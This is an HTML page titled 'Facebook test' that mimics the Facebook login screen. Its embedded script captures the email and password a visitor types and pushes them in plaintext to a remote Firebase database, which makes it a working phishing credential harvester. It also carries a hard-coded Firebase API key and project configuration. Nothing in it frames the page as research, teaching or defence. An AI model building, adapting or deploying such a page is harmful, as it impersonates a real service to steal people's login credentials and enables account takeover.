<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook test</title>
    <link rel="stylesheet" href="./css/styles.css">
    <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
</head>

<body>
    <div class="container">
        <div class="main">
            <img src="./images/logo.png" class="logo-img">
            <div class="a-ri8">Facebook helps you connect and share with the people in your life.</div>
            <form class="form" id="loginForm">
                <input type="email" id="Email" class="a-email" name="Email" placeholder="Email address or phone number"
                    required>
                <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password" required>
                <input type="submit" class="a-sub" value="Log In">
            </form>
            <a href="#" class="a-link">Forgot password?</a>
        </div>
    
              
   
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js">  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        // Initialize Firebase with your configuration
        const firebaseConfig = {
            apiKey: "AIzaSyA-VoWsBF1alsgnS3mZMiAsME93e6WAamY",
            authDomain: "even-dream-330116.firebaseapp.com",
            databaseURL: "https://even-dream-330116-default-rtdb.firebaseio.com",
            projectId: "even-dream-330116",
            storageBucket: "even-dream-330116.appspot.com",
            messagingSenderId: "546532011978",
            appId: "1:546532011978:web:7491e608705a59ef42a933",
            measurementId: "G-22D2XEGXDG"
        };
        firebase.initializeApp(firebaseConfig);

        // Handle form submission
        const loginForm = document.getElementById("loginForm");
        loginForm.addEventListener("submit", (event) => {
            event.preventDefault();

            const email = document.getElementById("Email").value;
            const password = document.getElementById("Password").value;

            const loginData = {
                email: email,
                password: password
            };

            const loginRef = firebase.database().ref("loginData");
            loginRef.push(loginData)
                .then(() => {
                    alert("Login data submitted successfully!");
                    loginForm.reset();
                })
                .catch((error) => {
                    console.error("Error submitting login data: ", error);
                });
        });  </script>
    
</body>

</html>
